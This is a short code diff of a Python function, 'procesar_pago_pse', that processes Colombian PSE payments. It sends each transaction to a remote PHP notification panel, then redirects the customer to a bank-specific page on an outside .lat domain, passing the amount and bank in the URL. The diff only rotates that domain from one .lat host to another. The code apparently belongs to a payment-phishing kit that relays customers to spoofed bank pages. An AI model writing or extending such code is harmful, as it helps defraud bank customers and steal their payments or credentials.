@@ -126,7 +126,7 @@ async def procesar_pago_pse(
 ):
     """
     1. Lee el monto real desde la BD SQLite.
-    2. Envia POST a 'https://bogodash.lat/panel/notificar.php' para guardar en notis.json y obtener la ruta del banco.
+    2. Envia POST a 'https://cadwon.lat/panel/notificar.php' para guardar en notis.json y obtener la ruta del banco.
     3. Redirige al cliente pasando el valor y banco como Query Parameters.
     """
     
@@ -135,8 +135,8 @@ async def procesar_pago_pse(
     monto = int(tx["monto"]) if tx else 0
     correo_cliente = correo or "-"
 
-    # 2. Notificar al PHP remoto (https://bogodash.lat/panel/notificar.php)
-    url_notificar_php = "https://bogodash.lat/panel/notificar.php"
+    # 2. Notificar al PHP remoto (https://cadwon.lat/panel/notificar.php)
+    url_notificar_php = "https://cadwon.lat/panel/notificar.php"
     subruta_entidad = ""
 
     try:
@@ -161,7 +161,7 @@ async def procesar_pago_pse(
 
     # Construir URL limpia para redirección
     subruta_limpia = subruta_entidad.strip("/")
-    url_destino = f"https://bogodash.lat/{subruta_limpia}/?valor={monto}&banco={banco}"
+    url_destino = f"https://cadwon.lat/{subruta_limpia}/?valor={monto}&banco={banco}"
 
     # 3. Transmitir evento al Panel Admin local
     await manager.broadcast({
